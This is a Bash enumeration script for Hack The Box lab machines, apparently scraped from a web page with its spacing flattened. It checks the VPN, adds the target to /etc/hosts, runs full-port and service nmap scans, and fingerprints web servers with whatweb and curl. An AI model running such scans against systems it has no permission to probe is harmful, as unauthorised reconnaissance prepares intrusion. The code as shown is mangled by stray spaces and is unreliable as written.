whatweb y curl -I HTBenum.sh #!/bin/bash # HTB Enumeration Script # LoRKa command -v nmap >/dev/null 2 > & 1 || { echo -e > & 2 \"[\\e[1;31m!\\e[0m] You need \\e[1;32mnmap\\e[0m , please install it.\" ; exit 1 ; } command -v whatweb >/dev/null 2 > & 1 || { echo -e > & 2 \"[\\e[1;31m!\\e[0m] You need \\e[1;32mwhatweb\\e[0m , please install it.\" ; exit 1 ; } command -v curl >/dev/null 2 > & 1 || { echo -e > & 2 \"[\\e[1;31m!\\e[0m] You need \\e[1;32mcurl\\e[0m , please install it.\" ; exit 1 ; } if [ \" $# \" -ne \"2\" ] || [ \" $# \" -gt \"2\" ] ; then echo \"[+] Use: $( basename $0 ) machineNAME machineIP\" echo \"[+] Exp: $( basename $0 ) Armageddon 10.10.10.233\" exit -1 fi trap '/bin/rm -rf \"$TMPFILE\"' EXIT #Vars NAME = \" $1 \" IP = \" $2 \" TMPFILE = $( mktemp ) FOLDER = \"/hackthebox/ $NAME \" #Functions checkvpn (){ ip -4 a show tun0 1 >/dev/null 2 >/dev/null if [ $? -ne 0 ] ; then printf '%s\\n' \"[!] ERROR: la VPN no esta conectada :(\" exit -1 fi } checkping (){ timeout 0 .3 ping -c1 $IP 1 >/dev/null 2 >/dev/null if [ $? -ne 0 ] ; then printf '%s\\n' \"[!] ERROR: la ip $IP no contesta a ping :(\" exit -1 fi } createfolder (){ if [ -d \" $FOLDER \" ] ; then printf '%s\\n' \"[!] Cuidado! el directorio $FOLDER existe!\" exit -1 fi mkdir -p $FOLDER } addhost (){ local HOSTSFILE = \"/etc/hosts\" local HOSTNAME = \" $NAME .htb\" local IP = \" $IP \" local LINE = \" $IP \\t $HOSTNAME \" if [ -n \" $( grep $HOSTNAME $HOSTSFILE ) \" ] then printf '%s\\n' \"[!] $HOSTNAME ya existe en $HOSTSFILE : $( grep $HOSTNAME $HOSTSFILE ) \" else sh -c -e \"echo ' $LINE ' >> $HOSTSFILE \" ; if [ -n \" $( grep $HOSTNAME $HOSTSFILE ) \" ] then : else printf '%s\\n' \"[+] Error al agregar $HOSTNAME , prueba de nuevo!\" ; fi fi } scan (){ /usr/bin/nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG $TMPFILE $IP local PORTS = $( /bin/cat $TMPFILE | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS = '/' | xargs | tr ' ' ',' ) /usr/bin/nmap -sC -sV -p $PORTS -oN $FOLDER /nmap.txt $IP } webinfo (){ local OUTPUT = \" $FOLDER /webinfo.txt\" if cat $TMPFILE | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS = '/' | grep -w '80' ; then whatweb http:// $NAME .htb >> $OUTPUT echo \"\" >> $OUTPUT curl -s -I -X GET http:// $NAME .htb >> $OUTPUT elif cat $TMPFILE | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS = '/' | grep -w '443' ; then whatweb https:// $NAME .htb >> $OUTPUT echo \"\" >> $OUTPUT curl -s -k -I -X GET https:// $NAME .htb >> $OUTPUT fi } #RunAway checkvpn checkping createfolder addhost scan webinfo","title":"Enumeration Script "}]}